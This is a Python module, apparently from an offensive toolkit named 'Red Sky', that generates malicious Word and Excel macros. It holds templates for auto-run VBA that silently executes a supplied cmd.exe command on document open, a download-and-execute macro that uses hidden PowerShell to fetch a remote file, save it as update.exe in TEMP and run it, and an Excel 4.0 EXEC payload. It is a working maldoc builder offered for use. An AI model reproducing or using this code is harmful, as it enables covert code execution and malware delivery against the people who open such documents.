# language: Python, file: Program/payload/macro.py, target: Red Sky payload — Office macro
# Build Office macros (Word/Excel) that run on Document_Open. Supports VBA and
# Excel 4.0 (XLM) formats.

import sys
from pathlib import Path
from typing import List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


VBA_TEMPLATE = '''Sub AutoOpen()
    Auto_Open
End Sub

Sub Document_Open()
    Auto_Open
End Sub

Sub Workbook_Open()
    Auto_Open
End Sub

Sub Auto_Open()
    Dim cmd As String
    cmd = "cmd.exe /c {payload}"
    CreateObject("WScript.Shell").Run cmd, 0, False
End Sub
'''


VBA_DOWNLOAD_EXEC = '''Sub Auto_Open()
    Dim url As String
    Dim tmp As String
    Dim shell As Object
    url = "{url}"
    tmp = Environ("TEMP") & "\\update.exe"
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -NoP -W Hidden -c ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & tmp & "'""", 0, True
    shell.Run tmp, 0, False
End Sub

Sub AutoOpen()
    Auto_Open
End Sub

Sub Document_Open()
    Auto_Open
End Sub
'''


XLM_TEMPLATE = '''=EXEC("cmd.exe /c {payload}")
=HALT()
'''


def cmd_gen(macro_type: str, payload: str, out_file: str = "") -> int:
    macro_type = macro_type.lower()

    if macro_type == "vba":
        result = VBA_TEMPLATE.format(payload=payload)
    elif macro_type == "download":
        result = VBA_DOWNLOAD_EXEC.format(url=payload)
    elif macro_type == "xlm":
        result = XLM_TEMPLATE.format(payload=payload)
    else:
        print_err(f"unknown macro type: {macro_type}")
        print_info("available: vba | download | xlm")
        return 2

    print_info(f"generated {macro_type} macro")
    print()
    print(result)

    if out_file:
        out = Path(out_file)
    else:
        out = OUTPUT_DIR / "payload" / f"macro_{macro_type}.txt"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(result)
    print_kv("saved", out)
    return 0


def run_cli(args: List[str]) -> int:
    if len(args) < 2:
        print_err("usage: redsky payload macro <vba|download|xlm> <payload_or_url> [out_file]")
        return 2
    return cmd_gen(args[0], args[1], args[2] if len(args) > 2 else "")


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
